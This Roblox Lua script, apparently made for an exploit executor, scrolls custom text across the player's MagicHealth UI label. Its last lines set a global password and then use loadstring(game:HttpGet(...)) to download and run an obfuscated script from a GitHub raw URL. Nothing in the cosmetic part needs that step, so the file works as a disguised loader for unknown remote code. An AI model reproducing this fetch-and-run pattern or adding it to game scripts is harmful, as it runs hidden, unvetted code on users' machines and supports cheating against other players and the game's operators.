local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")
local playerGui = player:WaitForChild("PlayerGui")

-- Find Hotbar UI
local hotbar = playerGui:FindFirstChild("Hotbar")
local backpack = hotbar and hotbar:FindFirstChild("Backpack")
local hotbarFrame = backpack and backpack:FindFirstChild("Hotbar")

-- Find MagicHealth UI
local screengui = playerGui:FindFirstChild("ScreenGui")
local ultbar = screengui and screengui:FindFirstChild("MagicHealth")
local ultcolor = ultbar and ultbar:FindFirstChild("Health")
local ulttext = ultbar and ultbar:FindFirstChild("TextLabel")

-- Ensure the TextLabel exists before modifying it
if not ulttext then
    warn("TextLabel (MagicHealth.TextLabel) not found!")
    return
end

-- Scrolling Text Variables
local textToScroll = " Messages from the Stars - Rah band " -- Custom message
local scrollSpeed = 0.12 -- Lower = Faster scroll

-- Function to create the scrolling effect
local function scrollText()
    while true do
        for i = 1, #textToScroll do
            ulttext.Text = string.sub(textToScroll, i) .. string.sub(textToScroll, 1, i - 1)
            wait(scrollSpeed)
        end
    end
end

-- Start Scrolling Effect
if getgenv().ScrollingUlt then
    scrollText()
else
    ulttext.Text = textToScroll
end
getgenv().Password = "Gz8#kL2mXv9!pQrT5dY"
loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Xyphor%20Obfuscated.txt", true))()
